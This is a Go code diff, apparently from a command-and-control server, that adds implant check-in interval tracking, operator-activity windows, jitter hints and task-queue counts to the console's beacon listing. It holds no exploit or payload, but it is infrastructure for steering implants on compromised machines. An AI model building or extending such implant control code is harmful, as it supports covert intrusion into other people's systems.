@@ -26,11 +26,17 @@ const (
 
 // Beacon is the console-facing view of a known implant.
 type Beacon struct {
-	ID        string     `json:"ID"`
-	Info      BeaconInfo `json:"Info"`
-	SecretB64 string     `json:"SecretB64"`
-	FirstSeen time.Time  `json:"FirstSeen"`
-	LastSeen  time.Time  `json:"LastSeen"`
+	ID           string     `json:"ID"`
+	Info         BeaconInfo `json:"Info"`
+	SecretB64    string     `json:"SecretB64"`
+	FirstSeen    time.Time  `json:"FirstSeen"`
+	LastSeen     time.Time  `json:"LastSeen"`
+	IntervalSec  uint32     `json:"IntervalSec"`  // 当前下发给植入体的回连间隔
+	IdleSec      uint32     `json:"IdleSec"`      // 监听器空闲档
+	FastSec      uint32     `json:"FastSec"`      // 监听器干活档
+	Active       bool       `json:"Active"`       // 操作员活跃窗口内
+	Queued       int        `json:"Queued"`       // 待下发任务数
+	BaseInterval uint32     `json:"BaseInterval"` // sleep 任务设定的单信标基准；0=用空闲档
 }
 
 // Result is a completed task outcome, consumed by the console on read.
@@ -111,13 +117,28 @@ func (s *Store) SetBaseInterval(id string, sec uint32) {
 // fast while the operator is in an active window, otherwise the beacon's
 // base (or the listener idle policy when no base was set).
 func (s *Store) NextInterval(id string) uint32 {
+	sec, _ := s.IntervalHint(id)
+	return sec
+}
+
+// IntervalHint returns the next sleep base and whether the implant must
+// sleep that many seconds exactly. exact is true only in the operator's
+// active window; idle sleeps are jittered by the implant.
+func (s *Store) IntervalHint(id string) (sec uint32, exact bool) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
 	now := s.nowFn()
-	if st, ok := s.beacons[id]; ok && now.Sub(st.lastActive) < activeWindow {
+	st, ok := s.beacons[id]
+	exact = ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
+	return s.nextIntervalLocked(id, now), exact
+}
+
+func (s *Store) nextIntervalLocked(id string, now time.Time) uint32 {
+	st, ok := s.beacons[id]
+	if ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow {
 		return s.fastInterval
 	}
-	if st, ok := s.beacons[id]; ok && st.baseIntervalSec > 0 {
+	if ok && st.baseIntervalSec > 0 {
 		return st.baseIntervalSec
 	}
 	return s.idleInterval
@@ -224,7 +245,6 @@ func (s *Store) TakeResults(id string) []Result {
 	if !ok {
 		return nil
 	}
-	st.lastActive = s.nowFn() // 操作员拉结果 = 活跃
 	results := st.results
 	st.results = nil
 	st.resultBytes = 0
@@ -241,9 +261,23 @@ func (s *Store) IntervalPolicy() (idle, fast uint32) {
 func (s *Store) ListBeacons() []Beacon {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
+	now := s.nowFn()
 	out := make([]Beacon, 0, len(s.beacons))
 	for id, st := range s.beacons {
-		out = append(out, Beacon{ID: id, Info: st.info, SecretB64: st.secretB64, FirstSeen: st.firstSeen, LastSeen: st.lastSeen})
+		active := !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
+		out = append(out, Beacon{
+			ID:           id,
+			Info:         st.info,
+			SecretB64:    st.secretB64,
+			FirstSeen:    st.firstSeen,
+			LastSeen:     st.lastSeen,
+			IntervalSec:  s.nextIntervalLocked(id, now),
+			IdleSec:      s.idleInterval,
+			FastSec:      s.fastInterval,
+			Active:       active,
+			Queued:       len(st.tasks),
+			BaseInterval: st.baseIntervalSec,
+		})
 	}
 	sort.Slice(out, func(i, j int) bool { return out[i].LastSeen.After(out[j].LastSeen) })
 	return out
